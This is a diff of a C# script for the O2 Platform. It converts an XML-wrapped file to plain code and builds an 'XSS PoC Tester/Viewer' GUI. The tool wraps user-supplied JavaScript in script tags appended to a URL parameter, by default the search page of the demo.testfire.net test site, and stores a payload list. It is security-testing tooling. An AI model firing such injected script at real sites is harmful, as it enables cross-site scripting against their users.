@@ -1,68 +1,66 @@
-<?xml version="1.0"?>
-<H2>
-  <SourceCode>var topPanel = "Util - XSS PoC Tester/Viewer".popupWindow(1000,800); 
+var topPanel = "Util - XSS PoC Tester/Viewer".popupWindow(1000,800); 
 //var topPanel = panel.clear().add_Panel();
 
-string jQueryUrl = "&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js\"&gt;&lt;/script&gt;";
+string jQueryUrl = "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js\"></script>";
 
 var payloadLocation = topPanel.insert_Above(20).add_TextBox("Payload Location:","");//.align_Right(topPanel); 
 var ie = topPanel.add_IE_with_NavigationBar();//.silent(true); 
 var payloadText = topPanel.insert_Below(100).add_TextArea();
 
 Action executeScript = 
-	()=&gt; {
+	()=> {
 			"invoking: {0}".info(payloadText.get_Text());
 						 ie.eval(payloadText.get_Text());};
 						 
-Action&lt;string&gt; executeScriptViaXss = 	
-	(payload)=&gt;{
-					var urlWithPayload = "{0}{1}&lt;script&gt;{2}&lt;/script&gt;".format(payloadLocation.get_Text(), jQueryUrl,payload.urlEncode());
+Action<string> executeScriptViaXss = 	
+	(payload)=>{
+					var urlWithPayload = "{0}{1}<script>{2}</script>".format(payloadLocation.get_Text(), jQueryUrl,payload.urlEncode());
 					ie.open(urlWithPayload); 
 					urlWithPayload.clipboardText_Set();
 			   };
 var payloadsTreeView = topPanel.insert_Left(150,"Payloads").add_TreeView();
-payloadText.insert_Left(100).add_Button("Execute Script on Browser").onClick(()=&gt;executeScript()).fill().font_bold();
-payloadText.insert_Right(100).add_Button("Execute Script via XSS Injection").onClick(()=&gt;executeScriptViaXss(payloadText.get_Text())).fill().font_bold(); 
+payloadText.insert_Left(100).add_Button("Execute Script on Browser").onClick(()=>executeScript()).fill().font_bold();
+payloadText.insert_Right(100).add_Button("Execute Script via XSS Injection").onClick(()=>executeScriptViaXss(payloadText.get_Text())).fill().font_bold(); 
 var payloadTitle = payloadText.insert_Below(20).add_TextBox("Payload Title","");
 
 
 var payloadsFile = "";
 
-Action&lt;string&gt; loadPayloads = 
-	(fileToLoad)=&gt; {
+Action<string> loadPayloads = 
+	(fileToLoad)=> {
 						payloadsFile = fileToLoad;
 						if (payloadsFile.inValid())
 							payloadsFile = "_xssPayloads.xml".tempFile(); 
-						payloadsTreeView.add_Nodes(payloadsFile.load&lt;Items&gt;());
+						payloadsTreeView.add_Nodes(payloadsFile.load<Items>());
 				   };
 
 Action savePayloads =  
-	()=&gt;{ 
-			var items = new Items().add(payloadsTreeView.nodes().tags&lt;Item&gt;());
+	()=>{ 
+			var items = new Items().add(payloadsTreeView.nodes().tags<Item>());
 			items.saveAs(payloadsFile);
 			"{0} xss payloads saved to {1}".info(items.size(), payloadsFile);
 		};
 		 	
 Action addToPayloadsList = 
-	()=&gt;{
+	()=>{
 			payloadsTreeView.add_Node(new Item(payloadTitle.get_Text(), payloadText.get_Text()));
 			savePayloads();
 		};
 		
-payloadsTreeView.afterSelect&lt;Item&gt;(
-	(item)=&gt;{
+payloadsTreeView.afterSelect<Item>(
+	(item)=>{
 				payloadTitle.set_Text(item.Key);
 				payloadText.set_Text(item.Value);
 				savePayloads();
 			});
 
-Action deleteSelectedPayload = ()=&gt; payloadsTreeView.remove_Node(payloadsTreeView.selected());
+Action deleteSelectedPayload = ()=> payloadsTreeView.remove_Node(payloadsTreeView.selected());
 payloadsTreeView.add_ContextMenu()
-				//.add_MenuItem("Save Payloads", true,()=&gt; savePayloads())
-				.add_MenuItem("Delete Selected Payload", true,()=&gt; deleteSelectedPayload());
-payloadText.add_ContextMenu().add_MenuItem("Add To Payloads List", ()=&gt; addToPayloadsList());
+				//.add_MenuItem("Save Payloads", true,()=> savePayloads())
+				.add_MenuItem("Delete Selected Payload", true,()=> deleteSelectedPayload());
+payloadText.add_ContextMenu().add_MenuItem("Add To Payloads List", ()=> addToPayloadsList());
 
-payloadsTreeView.onDrop((file)=&gt;loadPayloads(file));
+payloadsTreeView.onDrop((file)=>loadPayloads(file));
 
 //payloadTitle.set_Text("Xss PoC - {0}".format(5.randomLetters()));
 
@@ -74,15 +72,15 @@ payloadLocation.set_Text("http://demo.testfire.net/search.aspx?txtSearch=");
 executeScriptViaXss("");
 
 //payloadText.set_Text("alert('xss');");
-Action&lt;string&gt; setPayloadLocation = 
-	(location)=&gt;{
+Action<string> setPayloadLocation = 
+	(location)=>{
 					payloadLocation.set_Text(location);
 					executeScriptViaXss("");
 				};
 
 
 return setPayloadLocation;
-//O2File:WatiN_IE_ExtensionMethods.cs
-//O2Ref:WatiN.Core.1x.dll</SourceCode>
-  <ReferencedAssemblies />
-</H2>
+
+//using FluentSharp.Watin
+//O2Ref:FluentSharp.Watin.dll
+//O2Ref:Watin.Core.dll
